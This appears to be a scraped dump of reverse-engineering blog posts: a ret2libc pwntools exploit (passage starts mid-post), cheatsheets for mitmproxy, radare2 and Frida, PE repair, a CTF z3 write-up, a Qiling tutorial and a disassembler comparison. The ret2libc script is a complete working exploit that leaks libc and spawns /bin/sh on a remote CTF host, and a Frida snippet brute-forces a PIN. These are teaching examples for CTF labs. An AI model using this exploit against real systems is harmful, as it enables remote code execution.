like \u0026#39;/bin/shFEFE\u0026#39; which obviously doesn\u0026#39;t exists in linux payload = b\u0026#34;\u0026#34;.join([fill, rop.chain()]) p.sendline(payload) p.interactive() The last line (p.interactive()) spawns the interactive shell:\n$ ps PID TTY TIME CMD 26 ? 00:00:00 binary 27 ? 00:00:00 sh 28 ? 00:00:00 sh Full script import pwn #p = pwn.process(\u0026#39;./binary\u0026#39;) p = pwn.remote(\u0026#34;138.68.182.108\u0026#34;, 30784) pwn.context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;) #pwn.context.log_level = \u0026#39;debug\u0026#39; elf = pwn.ELF(\u0026#34;./binary\u0026#34;) libc = pwn.ELF(\u0026#34;./libc.so.6\u0026#34;) pwn.info(\u0026#34;Stage 1, leak puts addr\u0026#34;) p.recvuntil(...) p.sendline(...) p.recv(...) # prepare payload fill = b\u0026#39;A\u0026#39; * 40 rop = pwn.ROP(elf) rop.call(elf.plt[\u0026#34;puts\u0026#34;], [elf.got[\u0026#34;puts\u0026#34;]]) rop.call(elf.symbols[\u0026#34;fill\u0026#34;]) payload = b\u0026#34;\u0026#34;.join([fill, rop.chain()]) p.sendline(payload) p.recvuntil(\u0026#34;Enjoy your \u0026#34;) # extract leaked puts address raw_data = p.recvuntil(\u0026#39;\\n\u0026#39;) raw_data = raw_data.strip() # \\ raw_data = raw_data[-6:] # - skip unnecesary data leaked_puts = raw_data.ljust(8, b\u0026#39;\\x00\u0026#39;) # fill missing bytes with zeroes leaked_puts = pwn.u64(leaked_puts) pwn.success(f\u0026#39;Leaked puts: {leaked_puts:x}\u0026#39;) pwn.info(\u0026#34;Stage 2, ret2shell\u0026#34;) # calculate offset, base address of the libc in the memory libc.address = leaked_puts - libc.symbols[\u0026#39;puts\u0026#39;] # prepare the final payload rop = pwn.ROP(libc) rop.call(rop.find_gadget([\u0026#39;ret\u0026#39;])) rop.call(libc.symbols[\u0026#39;system\u0026#39;], [next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;))]) payload = b\u0026#34;\u0026#34;.join([fill, rop.chain()]) p.sendline(payload) pwn.success(\u0026#34;Have fun!\u0026#34;) p.interactive() References https://www.agner.org/optimize/calling_conventions.pdf\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://rehex.ninja/posts/ret2libc/","summary":"\u003cp\u003eHow to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc \u0026amp; pwntools by example.\u003c/p\u003e","title":"pwn\u003e ret2libc by example"},{"content":" https://mitmproxy.org/ Start # start (default port 8080) $ mitmproxy # web gui $ mitmweb # start proxy \u0026amp; save traffic $ mitmdump -w cap.log $ mitmpdump \u0026#39;google\\.com\u0026#39; # capture only specified host --alow-hosts listen only for specified traffic i.e google\\.com Navigation Key Info Requests List Arrows (Up / Down) Navigate through replies Enter Confirm / Enter R Reply request (re-send request) Request Details Arrows (Left / Right) Change Active tabs ? Help I Intercept Regex E Edit Request Q Previous Menu A Sent Request Intercept Requests Press I after starting mitmproxy and type command\n# Regex based on URL ~u RegexHere RED colored requests are intercepted enter into it and press E to modify request content\n","permalink":"https://rehex.ninja/posts/mitmproxy/","summary":"","title":"!e MITM Proxy"},{"content":"radare2 / rizin cheatsheet\nWarning: This cheatsheet was originally created for r2, but it should still be compatibile for rizin\nradare2 rizin Debugging Manage file # open in debug mode r2 -d $FILE doo # re-open file in debug mode ood # / Flow control # display / set breakpoint db [flag/addr] # continue to breakpoint dc # continue until addr / flag (without setting breakpoint) dcu \u0026lt;flag/addr\u0026gt; # break on syscall name / value dcs \u0026lt;syscall\u0026gt; # step into N instructions ds [N] # step over N instructions dso [N] Reverse debugging dts? # select some point db sym.foo # store point in time / start recording? dts+ dc # go to the previous instruction dsb # write / read ALL trace sessions to / from disk dtst sessions.dbg dtsf sessions.dbg Read values # show registers drr # show stack contents pxr @ rsp!32 Scripting (hooks) # auto-run command on breakpoint db main # set breakpoint dbc main drr\t# set command on breakpoint Custom environment Note that when first starting radare2 in debug mode, you will actually be debugging rarun2! You need to first continue execution (dc) which will leave you in the loader for the program itself.\n# run program with custom environment r2 -d rarun2 program=./\u0026lt;program_name\u0026gt; arg0=foo stdin=./\u0026lt;some_file\u0026gt; setenv=ENV_VAR=\u0026lt;value\u0026gt; ==OR==\n#!/usr/bin/rarun2 program=./\u0026lt;program_name\u0026gt; arg0=foo stdin=./\u0026lt;some_file\u0026gt; setenv=ENV_VAR=\u0026lt;value\u0026gt; r2 -d rarun2 script.rr2 Visual debugging (Enter V command to enter or VV / VV!), with [p] / [P] you can change views)\nWith dm you can check if you are still in loader code - search for ()*.\n[.] -\u0026gt; seek to program counter [c] -\u0026gt; toggle cursor [o] -\u0026gt; toggle asm / pseudo [g] -\u0026gt; seek to… [G] -\u0026gt; seek to highlighted [u], [U] -\u0026gt; undo / redo seek , [X] -\u0026gt; xrefs from/to [B], [F2] -\u0026gt; toggle breakpoint [s], [F7] -\u0026gt; step into [S], [F8] -\u0026gt; step over [F9] -\u0026gt; continue [t] -\u0026gt; tab managment ESIL ESIL · Radare2 Explorations ESIL · Radare2 Book e asm.emu = true # esil comments e io.cache = true # write in memory cache Visual mode [O] - toggle pseudocode / ESIL Commands # check used registers by the function aeaf Example session aei # init esil vm aeim # init mem aeip # set esil vm pointer to current seek aer\t# handle esil registers # example set value aer eax=0x1234 # # continue until eax is not greater than on start \u0026#34;aecue eax,0x1234,\u0026gt;\u0026#34; Macros Macros · Radare2 Book\nExample session\n# set up relative breakpoints. one per cmp instruction* db sym.check_code_int+0x00001289-0x00001265 db sym.check_code_int+0x000012b7-0x00001265 db sym.check_code_int+0x000012e2-0x00001265 db sym.check_code_int+0x0000130d-0x00001265*#* *execute program* dc* # input four digits (doesn\u0026#39;t matter which ones)* 1 1 1 1*# define a macro that replaces the value * *# of ebx with the content of eax and stores it into a file* !rm ./crack_code (eax_replace, dr ebx=`dr eax` | tee -a crack_code, dc)*# use the macro* .(eax_replace )@@=0 1 2 3*# show the results* !cat ./crack_code Malware Analysis ob= # show open files afl= # list function ranges aflt # show function table p= # show hist of entropy p== # show hist entropy horizontal Operations Writing r2 -w binary # write null-terminated string wz \u0026#34;hello there\u0026#34; psz # print it # write number at offset wx deadbeef @ 0x30 p8 @ 0x30!4 # print Write in block wo? # write bytes in sequence starting from 42, incrementing by 3 woe 42 3 @ edi!32 # xor block of memory by 41 wx 41 @ esp!32 Visual mode [TAB] -\u0026gt; switch between columns [c] -\u0026gt; toggle cursor mode [i] -\u0026gt; enter insert mode [A] -\u0026gt; assemble binary: enter your asm, instructions can be separated with ;, press [Enter] and [y] to save changes. Copy/Paste Enter to visual mode. Enable cursor mode with [c]. Press [Shift] to select area to copy, ten press [y]. Go to desired place and press [Y] to paste copied data. Code analysis Enter to Visual mode. Seek to piece of code for analysis Enter [d], then [f] for define function. References / Furtker Reading Introduction · Radare2 Explorations Introduction · Radare2 Book ","permalink":"https://rehex.ninja/posts/radare2-rizin-cheatsheet/","summary":"\u003cp\u003eradare2 / rizin cheatsheet\u003c/p\u003e","title":"!e radare2 / rizin cheatsheet"},{"content":"Tools PE-Bear CFF Explorer HxD - hex editor Troubleshooting Case 0: Broken headers Assumtion: you have dumped PE file with broken headers (i. e MZ PE magic bytes are gone).\nOpen dump.bin in hex editor Find reference parameter (use corkami-pics) which is probably not overwritten: Machine, for 32bit: 4c 01 Open good binary (for example unpacker exe) in hex editor: Find the same reference parameter Copy all bytes before it Go back to broken binary Paste bytes into dump.bin into all bytes before refence bytes. Re-allign sections if necessary. CASE 1: This app can't run on your PC What it really means: loader can't load it, so you also won't be able to load it into the debugger.\nResolution: manual headers fixing is required\nOpen file wit PE-Bear or CFF explorer Verify the state of binary, if it is in the mapped state (loaded into the process), then you might need to unmap it; otherwise: Review Optional Headers: look for red markings if some address is pointing into to not existing section in Section Headers → null it Review Section Headers: if address is highlighted with red color, then it means that sections are misaligned, you need to review binary in hex editor and start offset of the section manually if size is highlighted with red color, then you might need to shrink it or expand it will i.e null-pad (in hex editor) NOTE: Additional actions might be required!\nIf you are modifying size of section which is between other sections, then you might need to modify RA of the next sections!\nCASE 2: The application has failed to start because its side-by-side configuration is incorrect What it really means: Configuration file required to load is malformed.\nResolution: You need to replace configuration with the valid one.\nSome binaries are using special configuration files to load binary located in Resources/Configuration Files/1. To fix this issue edit the configuration manually or paste (with i.e hex editor) the default one presented below:\nDefault configuration.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;assembly xmlns=\u0026#34;urn:schemas-microsoft-com:asm.v1\u0026#34; manifestVersion=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;assemblyIdentity version=\u0026#34;1.0.0.0\u0026#34; name=\u0026#34;MyApplication.app\u0026#34;/\u0026gt; \u0026lt;trustInfo xmlns=\u0026#34;urn:schemas-microsoft-com:asm.v2\u0026#34;\u0026gt; \u0026lt;security\u0026gt; \u0026lt;requestedPrivileges xmlns=\u0026#34;urn:schemas-microsoft-com:asm.v3\u0026#34;\u0026gt; \u0026lt;requestedExecutionLevel level=\u0026#34;asInvoker\u0026#34; uiAccess=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;/requestedPrivileges\u0026gt; \u0026lt;/security\u0026gt; \u0026lt;/trustInfo\u0026gt; \u0026lt;/assembly\u0026gt; CASE 3: program.exe has stopped working What it really means: System was able to load PE into the memory and execute it, but execution failed for some reason.\nResolution: Analyze the issue with debugger and resolve it.\nThis is very common error and might indicate:\nmisaligned/missing sections; programming error, like not handled exception etc; other. To solve it you should open the program with debugger and analyze the conditions which are creating this error. Fix misalligned sections Make sure that you have binary which is:\ndumped, with fixed PE headers, unmapped. ![ScreenShot 2020-01-20 at 07.34.41](/img/broken-pe/ScreenShot 2020-01-20 at 08.48.16.png)\nAuto With pe_unmapper Github\n# pe_unmapper.exe \u0026lt;in_file\u0026gt; \u0026lt;base\u0026gt; \u0026lt;opt: out\u0026gt; \u0026gt; pe_unmapper.exe _02660000.mem 02660000 payload.dll Manual Open binary in hex editor Go to the 1st section (on example above to 0x1000) Section should start in this place, nulls should be before. Append nulls starting from last null seen before 1st section (0xfdf) to section start address (inconclusive) (0x1000). Save. Review in PE Bear: Sections \u0026gt; Section Headers should no longer be marked as read. if Section Headers \u0026gt; Image Base is the same as dumped section address (if not, set it to dumped section address). ","permalink":"https://rehex.ninja/posts/fix-broken-pe/","summary":"","title":"!e Fix Broken PE"},{"content":"Short blogpost about viewing 2 binary views (ghidra-like) in BinaryNinja\nProbably not everyone is aware, but it is possible to enable Ghidra-like mode which will show 2 synchronised binary representations of the same piece if binary, so: assembly and HLIL (decompiled output).\nSettings By default reflection view will sync the IL, so you shoud disable it in the settings.\nHINT: Search for \u0026ldquo;reflection\u0026rdquo; in Settings to find all settings related to this feature.\nHow to enable Open View \u0026gt; Native Docks \u0026gt; Show Reflection Take this window and snap it into convinient for you location Change the active IL view by selecting it in the list in the upper-right corner or by pressing I on keyboard. ","permalink":"https://rehex.ninja/posts/protip-binary-ninja-side-view/","summary":"\u003cp\u003eShort blogpost about viewing 2 binary views (ghidra-like) in BinaryNinja\u003c/p\u003e","title":"[HINT] BinaryNinja: how to view 2 IL views at the same time"},{"content":"About 247CTF The 247/CTF is a security Capture The Flag (CTF) learning environment. The platform contains a number of hacking challenges where you can test your skills across web, cryptography, networking, reversing and exploitation by solving problems to recover flags.\nOr generally saying it is the platform which hosts CTF challs for whole year :)\nTask - The Secret Lock Can you reverse the secret combination to open the lock and recover the flag?\nThe single HTML page is given with digital lock:\nit have 40 fields each field have 501 available values (0-500) Solution By looking into the code we can quickly identify the code section, because it is written in plain-text in the single \u0026lt;script\u0026gt; block. Below you can see the main unlocking logic:\nonChange() { this.code = this.getCode(); this.flag = this.checkFlag(this.code); this.dom.status.textContent = this.flag; } getCode() { let flag = {}; for (let i = 0, len = this.dom.rows.length; i \u0026lt; len; i++) { flag[i] = this.dom.rows[i].querySelector(\u0026#39;.is-selected .text\u0026#39;).textContent; } return flag; } checkFlag(flag){ let result = \u0026#34;LOCKED\u0026#34; this.dom.lock.classList.remove(\u0026#39;verified\u0026#39;); if (Object.keys(flag).length == 40 \u0026amp;\u0026amp; ((flag[37] - flag[37]) * flag[15] == 0) \u0026amp;\u0026amp; /* stripped for readibillity */)) { result = \u0026#34;\u0026#34;; for (var idx in flag) { result += (String.fromCharCode(flag[idx])); } this.dom.lock.classList.add(\u0026#39;verified\u0026#39;); } return result; } Here is the unlocking summary:\nOn each digit change the onChange() function is called. getCode() is run, it returns the integer value. Code is checked in checkFlag() which runs a lot of algebraic expressions (120 to be precise). I stripped them to improve the readibillity. If all checks are passed, then each value is treated as ascii character and it\u0026rsquo;s passed to result value. Like I mentioned before - we have big block of conditions which needs to be met, you can find short snippet below (I used visual-code to quickly get rid of \u0026amp;\u0026amp; operators and put each expression in new line).\n((flag[37] - flag[37]) * flag[15] == 0) ((flag[3] + flag[31]) ^ (flag[29] + flag[8]) == 234) ((flag[32] - flag[12]) * flag[9] == -2332) ((flag[24] - flag[27] + flag[13]) ^ flag[6] == 114) ((flag[38] - flag[15]) * flag[33] == 800) ((flag[34] - flag[21]) * flag[26] == 98) ((flag[29] + flag[0]) ^ (flag[8] + flag[38]) == 248) ((flag[21] * flag[18]) ^ (flag[7] - flag[15]) == 2694) ((flag[28] * flag[23]) ^ (flag[19] - flag[5]) == -9813) ((flag[34] + flag[30]) ^ (flag[37] + flag[6]) == 72) ((flag[23] - flag[22]) * flag[12] == 4950) ((flag[9] * flag[28]) ^ (flag[20] - flag[11]) == 5143) ((flag[2] * flag[22]) ^ (flag[37] - flag[0]) == 2759) We can notice a lot of expressions -\u0026gt; we can\u0026rsquo;t don\u0026rsquo;t want to solve it manually - we need to write a script.\nExpressions are utilizing different operations, so we can\u0026rsquo;t simply parse them in python, it is better to use some specialized tool like z3-solver:\nfrom z3 import * z = Solver() # We are creating the bit represenation of int32, 40 = len(FLAG) # I\u0026#39;m using vectors not ints, because ints are not supporting XOR flag = [BitVec(\u0026#39;flag{:02}\u0026#39;.format(i), 32) for i in range(40)] for i in flag: z.add(i \u0026gt; 0, i \u0026lt;= 500, i \u0026gt; 30, i \u0026lt; 127) # z.add(i \u0026gt; 30, i \u0026lt; 127) potential optimization # copy-paste the conditions z.add((flag[37] - flag[37]) * flag[15] == 0) z.add((flag[3] + flag[31]) ^ (flag[29] + flag[8]) == 234) ### ---[Stripped conditions]--- z.add((flag[9] - flag[26] + flag[23]) ^ flag[30] == 13) # Check if z3 can solve the problem if z.check() == \u0026#34;sat\u0026#34;: print(\u0026#34;z3 can solve it\u0026#34;) # now we can create the model and evaluate it to \u0026#34;real\u0026#34; values model = z.model() solution = \u0026#34;\u0026#34; for f in flag: solution += chr(int(model.evaluate(f).as_long())) print(solution) else: print(\u0026#34;unsolvable\u0026#34;) This will give as a flag :)\nReferences 247CTF z3-solver] SAT problem ","permalink":"https://rehex.ninja/posts/247ctf-the-secret-lock/","summary":"","title":"247CTF - The Secret Lock Writeup"},{"content":"Hello, this is the very first post of my new series where I will show the big potential of frida on practical examples.\nAbout If you want to learn more about frida, then I suggest you to check my notes/cheatsheet or frida\u0026rsquo;s docs.\nCheck tag #frida-playground for all posts.\nLab Setup My environment:\nhost machine - the place where I\u0026rsquo;m writing scripts, run scripts, etc guest vms - machines where ctf binaries are run: Windows10 (vbox) REmnux (vbox) Android (nox) Planned Content Game Hacking \u0026amp; \u0026ldquo;Cheats\u0026rdquo; Development for SUPERHOT: MIND CONTROL DELETE Solve some FlareOn challenges. References Frida FlareOn Cheatsheet ","permalink":"https://rehex.ninja/posts/0-frida-playgrounds/","summary":"\u003cp\u003eHello, this is the very first post of my new series where I will show the big potential of \u003ca href=\"/posts/0-frida-playgrounds/#references\"\u003efrida\u003c/a\u003e on practical examples.\u003c/p\u003e","title":"[0x0] FRIDA Playground"},{"content":" Notes are mostly based on the frida-boot labs.\nQuick Start Frida project quick start:\ngit clone https://github.com/trib0r3/frida-scripts Default stuff remote port: 27042 Code snippets: GitHub - iddoeldor/frida-snippets: Hand-crafted Frida examples https://codeshare.frida.re/ Useful API calls Debugging // print local environment (variables) console.log(JSON.stringify(this.context, null, 4)) Enumerate binary // list loaded libraries Process.enumerateModulesSync(); // list functions of the library Process.getModuleByName(\u0026#34;libc-2.30.so\u0026#34;).enumerateExports(); Resolving libs/funcs location // get reference to library Process.getModuleByName(\u0026#34;libc-2.30.so\u0026#34;); // Retrieve from symbols Module.getExportByName(/* libname or */ null, \u0026#34;sleep\u0026#34;); DebugSymbol.getFunctionByName(\u0026#34;sleep\u0026#34;); // Calculate based on offset Module.getBaseAddress(\u0026#34;libc-2.30.so\u0026#34;).add(\u0026#34;0xcad90\u0026#34;); \u0026#34;0x7fc2edc42d90\u0026#34; Script Communication via recv and send via RPC you can provide arguments and receive the return values whole logic can be held in python, only binary operations are in JS RPC TypeScript Get reference to the function Create it prototype Make them python-accessible by adding them to the rpc.exports dictionary. Python Reference functions with script.exports.\u0026lt;func_name\u0026gt;() var testPinPtr = DebugSymbol.getFunctionByName(\u0026#34;test_pin\u0026#34;); var testPin = new NativeFunction(testPinPtr, \u0026#34;int\u0026#34;, [\u0026#34;pointer\u0026#34;]); rpc.exports = { // defince accessible funcs from python testPin: function(p) { var pin = Memory.allocUtf8String(p); return testPin(pin); } } import frida import sys with open(\u0026#34;index.js\u0026#34;, \u0026#34;r\u0026#34;) as f: agent = f.read() session = frida.attach(\u0026#34;crypt\u0026#34;) script = session.create_script(agent) script.load() api = script.exports # ref to funcs from js for x in range(0, 9999): res = api.test_pin(str(x)) if res == 0: continue print(f\u0026#34;Pin: {x}\u0026#34;) break Reuse the binary code // get addr var testPinPtr = DebugSymbol.getFunctionByName(\u0026#34;test_pin\u0026#34;); // create JS wrapper var testPin = new NativeFunction(testPinPtr, \u0026#34;int\u0026#34;, [\u0026#34;pointer\u0026#34;]); for (var i = 0; i \u0026lt; 9999; i++) { console.log(\u0026#34;Trying: \u0026#34; + i.toString()); var pin = Memory.allocUtf8String(i.toString()); var r = testPin(pin); if (r == 1) { console.log(\u0026#34;Pin is: \u0026#34; + i.toString()); break; } } Function Hooking By symbol from __future__ import print_function import frida import sys session = frida.attach(\u0026#34;hello\u0026#34;) script = session.create_script(\u0026#34;\u0026#34;\u0026#34; Interceptor.attach(ptr(\u0026#34;%s\u0026#34;), { onEnter: function(args) { send(args[0].toInt32()); } }); \u0026#34;\u0026#34;\u0026#34; % int(sys.argv[1], 16)) def on_message(message, data): print(message) script.on(‘message’, on_message) script.load() sys.stdin.read() By symbol var rand_range = DebugSymbol.getFunctionByName(\u0026#34;rand_range\u0026#34;); Interceptor.attach(rand_range, { onEnter: function(args) { // Replace with string args[0] = Memory.allocUtf8String(\u0026#34;Frida sleep! :D\\n\u0026#34;); // Replace with int args[0] = new NativePointer(\u0026#34;0x1\u0026#34;) // or ptr(\u0026#34;0x1\u0026#34;) // Update the value this.arg1 = args[0]; }, onLeave: function(retval) { console.log(retval); retval.replace(this.arg1); } }); Remote execution (debugging) Proptip: Just add -H or -R if you want to use remote mode with default settings or you want to provide remote connection details\nfrida-server frida-gadget Tools frida CLI Open binary with frida \u0026lt;exec\u0026gt; command and play with it in interactive shell session.\nfrida-server (remote) # on victim frida-server -l 0.0.0.0:1337 # on local client frida-ps -H $IP:$PORT -R frida -H $IP:$PORT $proc_name frida-gadget (remote) Loaded apps are paused (can be changed), common ways of injecting gadget:\nload with LD_PRELOAD load with patchelf # on victim LD_PRELOAD=./frida-gadget.so ./crypt # on analysis machine frida-ps -R # should yield gadget process frida -R Gadget # on victim $ patchelf --add-needed ../frida-gadget.so crypt # on analysis machine $ ./crypt [Frida INFO] Listening on 127.0.0.1 TCP port 27042 Configure with frida-gadget.config (default):\n{ \u0026#34;interaction\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;listen\u0026#34;, \u0026#34;address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: 27042, \u0026#34;on_load\u0026#34;: \u0026#34;resume\u0026#34; } } Scripting:\n{ \u0026#34;interaction\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;script\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/root/code/embedded-agent.js\u0026#34; } } var testPinPtr = DebugSymbol.getFunctionByName(\u0026#34;test_pin\u0026#34;); var testPin = new NativeFunction(testPinPtr, \u0026#34;int\u0026#34;, [\u0026#34;pointer\u0026#34;]); for (var i = 0; i \u0026lt; 9999; i++) { console.log(\u0026#34;Trying: \u0026#34; + i.toString()); var pin = Memory.allocUtf8String(i.toString()); var r = testPin(pin); if (r == 1) { console.log(\u0026#34;Pin is: \u0026#34; + i.toString()); break; } } frida-trace Select function to trace Edit desired function behaviour Open __hooks__ directory edit scripts there Run \u0026amp; watch new injected behaviour onEnter: function (log, args, state) { args[1] = ptr(\u0026#39;1337\u0026#39;); log(\u0026#39;printf(\u0026#39; + \u0026#39;format=\u0026#34;\u0026#39; + args[0].readUtf8String() + \u0026#39;\u0026#34;\u0026#39; + \u0026#39;)\u0026#39;); }, Examples Spawn web server import { log } from \u0026#34;./logger\u0026#34;; import * as http from \u0026#34;http\u0026#34;; const testPinPtr = DebugSymbol.getFunctionByName(\u0026#34;test_pin\u0026#34;); const testPin = new NativeFunction(testPinPtr, \u0026#34;int\u0026#34;, [\u0026#34;pointer\u0026#34;]); rpc.exports = { testPin: function(p: string) { const pin = Memory.allocUtf8String(p); return testPin(pin); }, httpServer: function() { http.createServer((req, res) =\u0026gt; { const pin = req.url? req.url.replace(\u0026#39;/\u0026#39;, \u0026#39;\u0026#39;) : \u0026#39;\u0026#39;; const check = this.testPin(pin); log(`Request to check ${req.url} returned ${check}`); if (check == 1) { res.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39;}); res.write(`Welcome!\\n`); } else { res.writeHead(401, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39;}); res.write(`Wrong PIN\\n`); } res.end(); }).listen(1337); } } import frida import sys with open(\u0026#34;frida-agent-example/_agent.js\u0026#34;, \u0026#34;r\u0026#34;) as f: agent = f.read() session = frida.attach(\u0026#34;crypt\u0026#34;) script = session.create_script(agent) script.load() api = script.exports print(\u0026#34;starting HTTP server...\u0026#34;) api.http_server() # keep the server alive now sys.stdin.read() npm run build # or watch References https://frida.re https://github.com/leonjza/frida-boot ","permalink":"https://rehex.ninja/posts/frida-cheatsheet/","summary":"","title":"Frida Cheatsheet"},{"content":"It is very easy to upload something to the Internet, but hard to delete. This is short story about searching for \u0026ldquo;deleted\u0026rdquo; resources in the Internet.\nProblem These methods may help you if want to access some Internet resource (like document or page), but it is no longer available because website is down or author decided to remove it.\nFinding \u0026ldquo;removed\u0026rdquo; things Website mirrors If you know where this resource is placed (you know it\u0026rsquo;s url) the easiest method is to go to Web Archive, type your url and select a mirror from the timeline.\nGoogle cache Of course not all Internet resources are mirrored, so it may happen that web archive doesn\u0026rsquo;t have saved url interesting for you. If your resource was deleted recently you can always search for it\u0026rsquo;s search browser cached version, for google you need to type in search field:\ncache:\u0026lt;url\u0026gt; You can also use other search browser to achieve similar results.\nHunting for deleted things Finally if you don\u0026rsquo;t know your resource url you can also use other search browser than google, like DuckDuckGo. It may be useful, because google is removing dead url pretty quickly (it is also intentionally hiding some websites), so it is always good to use other search browsers.\n","permalink":"https://rehex.ninja/posts/nothing-is-lost-in-the-internet/","summary":"\u003cp\u003eIt  is very easy to upload something to the Internet, but hard to delete. This is short story about searching for \u0026ldquo;deleted\u0026rdquo; resources in the Internet.\u003c/p\u003e","title":"Nothing Is Lost in the Internet"},{"content":"What is Qiling From the author\u0026rsquo;s website:\nQiling is an advanced binary emulation framework, with the following features:\nCross platform: Windows, MacOS, Linux, BSD Cross architecture: X86, X86_64, Arm, Arm64, Mips Multiple file formats: PE, MachO, ELF Emulate \u0026amp; sandbox machine code in a isolated environment Supports cross architecture and platform debugging capabilities Provide high level API to setup \u0026amp; configure the sandbox Fine-grain instrumentation: allow hooks at various levels (instruction/basic-block/memory-access/exception/syscall/IO/etc) Allow dynamic hotpatch on-the-fly running code, including the loaded library True framework in Python, making it easy to build customized security analysis tools on top Qiling is backed by Unicorn engine.\nOr just saying shortly: this tool will allow you to run binary from one system to another, i.e you can run Windows PE on Mac.\nAdditionally you can also utilize its scripting ability to hook addresses, run only part of binary, etc. Check the references to view project\u0026rsquo;s GitHub page and others.\nSimple demo Let\u0026rsquo;s imagine that we have this simple task:\nObviously flag is generated from the stack strings with some on-the-fly operations, we can very easly capture the flag by setting couple of breakpoints in the debugger at addresses: 0x804852e and 0x804853d and check the contents of eax (notice that second part of the flag actually replaces the 1st part) or we can write simple script using Qiling:\nfrom qiling import * from os import environ EXEC_FILE = [\u0026#34;./task\u0026#34;] ROOTFS = \u0026#34;{}/x86_linux\u0026#34;.format(environ[\u0026#34;QILING_ROOTFS\u0026#34;]) FLAG = [] def on_hook(ql : core.Qiling) -\u0026gt; None: addr_flag = ql.reg.eax FLAG.append(ql.mem.read(addr_flag, 0x13)) def my_sandbox(path, rootfs): ql = Qiling(path, rootfs) # remove systrace logs ql.filter = [] ql.hook_address(on_hook, 0x804852e) ql.hook_address(on_hook, 0x804853d) ql.run() flag = FLAG[0][:0x12].decode() + FLAG[1][:7].decode() print(flag) if __name__ == \u0026#34;__main__\u0026#34;: my_sandbox(EXEC_FILE, ROOTFS) Some explanation: Qiling for execution requires 2 things:\nbinary - what is obvious; Rootfs - which should match target architecture. In my case environment variable $QILING_ROOTFS points to $QILING_REPO_DIR/examples/rootfs, above mentioned is a linux x86 binary so we are selecting x86_linux:\nfrom qiling import * from os import environ EXEC_FILE = [\u0026#34;./task\u0026#34;] ROOTFS = \u0026#34;{}/x86_linux\u0026#34;.format(environ[\u0026#34;QILING_ROOTFS\u0026#34;]) We want to break hook at specified addresses, so we can achieve that by calling hook_address(callback, address) I decided to reuse twice the same function, but you can create separate functions for that:\nql.hook_address(on_hook, 0x804852e) ql.hook_address(on_hook, 0x804853d) After everything is setup we can run the binary with ql.run().\nOur hook method reads the value from eax register and saves it in global variable:\ndef on_hook(ql : core.Qiling) -\u0026gt; None: addr_flag = ql.reg.eax FLAG.append(ql.mem.read(addr_flag, 0x13)) Notice that we are reading twice the same amount of bytes (ql.mem.read(addr_flag, 0x13)), so we need to truncate these array before printing it on the screen:\nflag = FLAG[0][:0x12].decode() + FLAG[1][:7].decode() print(flag) By default Qiling displays strace log, if you don\u0026rsquo;t want to see it or you want to see only logs from specific methods you can use filters (you need to change this variable before running the qiling):\n# mute strace log ql.filter = [] # display only \u0026#34;read\u0026#34; functions ql.filter = [\u0026#34;read\u0026#34;] Notice: the current version doesn\u0026rsquo;t have working properly filters, so you need to switch to dev branch.\nFinally you can run it with python and see the flag:\nClosing notes Qiling is definitely great framework, very simple to use and very powerful. Definately worth to try :)\nReferences Qiling Github Documentation ","permalink":"https://rehex.ninja/posts/qiling-scripting-and-simple-re-task/","summary":"Note about qiling and basic usage","title":"Qiling Scripting and Simple RE Task"},{"content":"Let\u0026rsquo;s compare the most populare reverse-egineering with strong focus on personal usage: BinaryNinja, Ghidra, IDA and radare2.\nHopefully this post will help you to find tools worth choosing as primary reverse engineering tool.\nScoring rules To be fair during my analysis I developed simple score system. For each feature product can specific amount of points:\n1.0 (+) - given feature is available and fully operational. 0.5 (~) - feature is partially available, you need to install plugin to achieve it or pay for extra license. 0.0 (-)- feature is not available at all. Comparision For detailed description of features go to corresponding chapters below.\n[Bracketed] character means that in my opinion specified tool is the \u0026ldquo;best\u0026rdquo; in the specified category (feature), it is not extra scored, but it may be useful for somebody.\n| | Price | Score | Cross-platform | Multi-arch | Decompiler | Debugger | Plugins (1) | Signatures (2) | Patching (3) | Symbolic constants | |:--------------------:|:-----:|:-----:|:--------------:|:-------------:|:----------------------:|:--------:|:------------:|:---------------:|:-------------:|:------------------:| | BinaryNinja 2.0.2097 | $150 | 7.0 | + | + | + | + | + | + | [+] | - | | Ghidra 9.1.2 | Free | 6.5 | + | + | [+] | - | ~ | + | + | + | | IDA Home(4) | $365 | 6.0 | ~ (1/license) | ~ (1/license) | ~ (extra-paid feature) | [+] | + | [+] | ~ | + | | radare2/Cutter | Free | 7.0 | [+] | [+] | + | + | + | + | + | - | Plugins - support for modern, updated programming languages. Signatures - built-in signatures with option to add own. Patching - ability to assemble code without using the hex-editor. IDA Home - currently this version is not published yet, but this is just a limited IDA Pro version, so I will rate it based on my previous experiences with IDA Pro (for limitation list go to References). Price Actually here is no winner, I would like to only mention that I skipped some freeware versions of paid tools:\nBinaryNinja Cloud - Binary Ninja Personal in browser, but without debugger and plugins support. IDA Freeware 7.0 - free version of IDA, with a lot of limitations. To be 100% honest, BinaryNinja also have standalone demo, but it is more limited than cloud version, so I decided to ignore it.\nScore Just remember to not blindly follow my scoring! This blog post is about my subjective point of view. If you want to know, which tool I like the most -\u0026gt; jump to the summary.\nCross platform From my perspective disassembly tool should be cross-platform, it is very annoying when you can\u0026rsquo;t easily install your tool on any operating system, specially when you are not staying with one favourite whole time (like me - I\u0026rsquo;m the user of OSX, Linux \u0026amp; Windows).\nUnfortunatelly IDA is \u0026ldquo;not the best\u0026rdquo; here, because you need to specify on what kind of operating system you are going to use it :/\nDon\u0026rsquo;t understand me wrong: you can disassemble Linux binaries on Windows and veice versa. But it means that if you decide to buy it in version for Windows, then you will receive IDA install files only for Windows.\nThe absolute winner is radare2, this tool you can 